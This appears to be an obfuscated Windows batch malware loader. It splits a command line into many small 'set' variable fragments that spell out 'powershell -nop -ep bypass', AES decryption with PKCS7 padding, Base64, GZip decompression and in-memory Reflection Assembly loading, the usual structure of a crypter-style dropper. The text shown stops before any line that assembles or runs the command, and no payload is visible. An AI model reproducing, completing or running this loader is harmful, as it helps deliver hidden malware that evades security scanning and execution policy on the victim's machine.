@echo off
set "LJcLeaSazp=\v"
set "PJkTRNxInq=in"
set "sMRmJpCpNl=co"
set "bapptQxzkG=nd"
set "IpGDAXxYcJ=st"
set "aTPiNDlnQT=he"
set "LlNAmtrGsk=we"
set "DGufpyacvh=Po"
set "fCprbcKXUR= C"
set "mNuPDoadAi=we"
set "yqXzDMvcLB=ll"
set "wEjHKSVvWP=he"
set "OjbMyXvvbu=rs"
set "APSpPMNDTe=ws"
set "JCYKdnHnDX=s\"
set "VvcJqhbgQt=xe"
set "cNnHKKEnQS=0\"
set "FOjDurRdeM=po"
set "xVJCHTcMyG= /"
set "DTaKvztiPG=py"
set "lzUEqgPQje=:\"
set "XJZJbyJDCo=y "
set "CUhonRZMvr=ll"
set "fWwzyzbElf=em"
set "EFuVZeYvto=ow"
set "sXVGevNwew=.e"
set "ikWnVKwIgN=32"
set "kFtgsyttHQ=do"
set "CSUcOesQOi=Wi"
set "UtjTGtVvkg=\W"
set "KUiMPlkElA=Sy"
set "HfYqhtYlbZ=1."
set "aCNtFaRUef=rS"
set "nGGuyyCdIg= %~dp0"
set "quOVSeJwkN=cd"
set "LtIZyQgbEp=736u"
set "hYHoPJZwSI=tem."
set "vMQiDPCVPm=tS46"
set "dOgmGCVyUu=$fwa"
set "TpvhGTuLbI=ose("
set "YtGMmEFwTG=]::("
set "CMnKvCkFkf= [Sy"
set "FSshGDQODK=saBm"
set "AcjytyOrhL=Syst"
set "ClqMaazTaI=tion"
set "xdnBkSVHrr=th('"
set "arAaocRMkY=y]::"
set "AOXmgcXTJW=ect "
set "SzGWHNoZwP=yste"
set "gLMQdDycHx=lBlo"
set "znKtkxFOKP=.Sec"
set "vWZPRpAjwc=.Mod"
set "RbLwXxQiij=raph"
set "NbPMqLPCWz= = $"
set "szzjGwxFjA=stem"
set "rJBZPfYjDd= '')"
set "fiiFRxMEqN=);$u"
set "MPVPutqYnf=-joi"
set "YXogefMJab=Mode"
set "WfqqVzkHld=m(, "
set "OHKfkDqRtF=t Sy"
set "ILbEAbLDNI=vert"
set "YKSxypaNtw=hCm "
set "ghZFvnCQSz=7Yiv"
set "aPXXcxoSpi=;$Ys"
set "yRXkZOjPHW=);$n"
set "vxOxCliRCi=g = "
set "OyhgVFxxAL=;$uD"
set "rXwLUuUsXj=Obje"
set "VuNBLlRJJb=Invo"
set "lgFAVdZMiJ=.Con"
set "scDfFmeCrj=ment"
set "akOJXZWIhX=[-1."
set "DbTpWkgtZN=;$vm"
set "aUzxytLvEs=urit"
set "bKfDnuxZId=);$f"
set "DFOdNDenpX=em.I"
set "lOnhEPmawZ=ress"
set "pIdjMsipLZ=.Key"
set "nOxzNiwKHl=jCJa"
set "zvhjmpbgpL=]::("
set "twxYaLLVsM=:: '"
set "MsvwJslsyC=mory"
set "GeUKTAtnDQ=yste"
set "QZyMTbQrwI=.Cre"
set "ETxAQlUIlw=sion"
set "sLPNgjzKMr=r = "
set "eZHodeqhUM= = ["
set "VaxYpRrAdg=oryS"
set "cJaphqxjmx=ose("
set "ONQGXYJQMh=New-"
set "kYeaWzJGSh=pres"
set "RtpYLEkkKn=.Mem"
set "cNDMWjAoPR=($hL"
set "RcKKjSwqwn=ptog"
set "gBApEWbmrG=3HWs"
set "VxHBpWIaZy=raph"
set "QhMhZunLta=rity"
set "BdWtQIeXyt=morF"
set "jOnfDaTHUb=::('"
set "awBOVQJFWd=ew-O"
set "fyVQRPjvQQ=.Dis"
set "ACQDxDCZni=3); "
set "mMacRyXhzh=tsWi"
set "ByetTWxfOJ=gth)"
set "hXCylmVhbd=and "
set "DHWZtPRDcO=.-16"
set "gjVlmRnWgd=O.Me"
set "MNooLXJZiC=hCm."
set "bIAWLtbSqA=('da"
set "GicmoDaOtM=oArr"
set "NYrjBhawGz=H.En"
set "JCWoscTDvk=)($B"
set "RoPUKmzFPo=rt]:"
set "BErEFiELGR=ptor"
set "QGkCabBwwm=hHnr"
set "TcHxUpEZyl=n ''"
set "jmXrEgzpCZ=ion."
set "VdyCFxYMGu=tem."
set "ERhaqWTwAY=:('g"
set "XJDMPgOGbL=am;$"
set "nmRVTeSNwd=PKCS"
set "HCgLMCdBxC=  $B"
set "qptYbVekPY=ke($"
set "USQITljsuv=fhHn"
set "pPDkfozHvf=('l0"
set "myXmMKPsES=jCJa"
set "IigkNexhwl=em.C"
set "tYjSqQKhcP=$TGc"
set "GZUJGzvLVs=pStr"
set "MLXdsTUcBD== [S"
set "eJVOslgkJb=1] -"
set "DuVDUjsBaO=ne);"
set "XBgDFxabLn=grap"
set "ltYrFdNWsc=m.IO"
set "tRNRDLNvvP=jCJa"
set "zHcSzBBVXm=njCJ"
set "qFUyTttlAA=S46e"
set "cysyFlTusT=.Com"
set "DtkqYBkJAi=.Cry"
set "PBOcHUARTg=Comp"
set "yCTCRAJsAJ=Bmor"
set "HgmaXaTbZM=ieWz"
set "PcaHnCDnZd=L, 0"
set "fVViXBllaS=trea"
set "xLhaRBQIIB=-nop"
set "RZcNvByIYr='dqR"
set "dcotxNBLHF=a.Pa"
set "JEHmLdMZhv=.Dis"
set "ENhdZNautz=Ja.I"
set "yYRIxNspto=..-1"
set "NaJovRMgZg=[Sys"
set "RpdgsgrPzc=;$vm"
set "wbLjiiKLMC=ring"
set "IloAYJdCvt=.IO."
set "luEKfPsCnJ=se()"
set "mWHFbyjSyg=[Env"
set "jUxyXCGZaa=ewLi"
set "RTmIjlWMwC=le  "
set "aUgkNKDKdj=OyzA"
set "HyTZdSsSaX=me ="
set "MdSOZtNWFy=).Sp"
set "HylBKQpMly=hLet"
set "xUmXgCujiB=eto "
set "KbbRaHatIB=hy.A"
set "SkKcJbaHtt=]::C"
set "weOFygXJFI=-ep "
set "tQheUsviMl=Cm.T"
set "mrzcfCtyHs=join"
set "DeoiTkVacN=$fwa"
set "VBwGwKZlzK=ode]"
set "YyAonwPzHT=.Cry"
set "pWmcvJRnHc=('%*'"
set "gTNKruQYGm=Comp"
set "PjMTscEMSv=[IO."
set "zSmqLIDWhV=y.Cr"
set "qliVcunHxO=$uDR"
set "NoBkBEZOUr=dI, "
set "WEYfGfpIqD=bypa"
set "opOXQcbNod=n ''"
set "euhYSLBvcU=tem."
set "FljnfKmesZ= New"
set "LmZKaSmqXG=..-1"
set "EuJMkQfbNL=esaB"
set "tEOhbMzqPt=$TGc"
set "FelgeJDDvG=comm"
set "ojiPhiPjnn=, $f"
set "dvWGWdcriG= if "
set "fmdHYNSDml=ateD"
set "HlEkoeMexi=ck($"
set "MPIFaRbiQu=ddin"
set "jaOFoqxNLM='txe"
set "ohylYACAFM=m.Re"
set "MuWMdNVtWK=pose"
set "IgFhjIcmJJ=esFX"
set "gDcliYtvrx=in $"
set "HAMHcSCuMi=v4Ir"
set "jVEsRiVozy=Secu"
set "RPKwDhLveI=.GZi"
set "NEwUTFlFRp=jL ="
set "edGzcqyARa=Fo7l"
set "YbdDzYECRi= [Sy"
set "oNUNtjtiNQ=tryP"
set "FKizfGgApV=rity"
set "NmmMWrTiHj=$TGc"
set "bkHmxMLmiG=I = "
set "xALRRNudfi=m.IO"
set "hdxzTgkUla== $n"
set "QNjXZTKoRZ=ddin"
set "nhoBXpCArp=YsBj"
set "xsJJYuEFyK=;$ui"
set "QfyeLQwmMA=]::N"
set "VJUZDAgNqJ=fwaj"
set "HYizUcAXiD=Su.T"
set "tuuBroJtOO=Fina"
set "esjzyfOIYJ=V = "
set "SmsksRlVXY=+hAO"
set "EDdQBzNwMP=yTo("
set "VkDFVKcItN=ct S"
set "kfPGiEOBPQ==');"
set "mBTvrYsctJ=e) {"
set "nJwIMQocbf=KRZF"
set "ylzopEKGTk=eto."
set "OzBwpTAZBJ=Disp"
